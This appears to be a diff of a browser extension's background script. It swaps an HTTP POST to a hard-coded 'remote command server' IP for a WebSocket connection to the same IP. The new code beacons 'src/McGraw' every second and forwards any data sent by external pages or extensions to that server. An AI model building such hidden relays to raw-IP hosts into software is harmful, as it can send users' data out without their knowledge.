@@ -1,45 +1,61 @@
-const REMOTE_COMMAND_SERVER_HOST='5.133.9.244'
-const REMOTE_COMMAND_SERVER_PORT=10000
-const UPDATE_API_URL = `http://${REMOTE_COMMAND_SERVER_HOST}:${REMOTE_COMMAND_SERVER_PORT}/update`;
+const APP_NAME = 'McGraw'
+const SERVER_URL = 'ws://5.133.9.244:10010'
 
-async function hitPostApi(url, body) {
-  const response = await fetch(url, {
-    method: 'POST',
-    body: JSON.stringify(body),
-    headers: new Headers({'content-type': 'application/json'}),
+let socket = null
+
+function sleep(duration) {
+  return new Promise((resolve, reject) => {
+    setTimeout(resolve, duration)
   })
-  if(response.status != 200)
-    throw new Error('api request failed')
-  return response
 }
 
-async function sendUpdate({text}) {
-  const response = await hitPostApi(UPDATE_API_URL, { text })
-}
-
-const messageHandlerMap = {
-  sendUpdate,
-}
-
-// Message handler for all incoming messages within the chrome extension
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  const messageType = request.message_type
-  if(messageHandlerMap[messageType]) {
-    (async() => {
-      try {
-        const data = { ...request }
-        const response = await messageHandlerMap[messageType](data)
-        sendResponse({
-          success: true,
-          ...response
-        })
-      } catch(error) {
-        sendResponse({
-          success: false,
-          error: JSON.stringify(error)
-        })
+(async() => {
+  while(true) {
+    try {
+      if(!socket) {
+        socket = await yieldSocket()
       }
-    })()
-    return true
+      if(socket) {
+        socket.send(`src/${APP_NAME}`)
+      }
+    } catch(err) {
+      console.log(err)
+    }
+    await sleep(1000)
+  }
+})();
+
+function yieldSocket() {
+  return new Promise((resolve, reject) => {
+    let skt = new WebSocket(SERVER_URL);
+    skt.onopen = (event) => {
+      console.log('websocket open');
+      resolve(skt)
+    };
+
+    skt.onerror = (event) => {
+      reject()
+    }
+
+    skt.onmessage = (event) => {
+    };
+
+    skt.onclose = (event) => {
+      console.log('websocket connection closed');
+      socket = null;
+    };
+  })
+}
+
+function sendWebSocket(data) {
+  if(socket)
+    socket.send(data)
+}
+
+chrome.runtime.onMessageExternal.addListener((request, sender, sendResponse) => {
+  const messageType = request.message_type
+  if(messageType === 'sendWebSocket') {
+    sendWebSocket(request.data)
+    return false
   }
 })
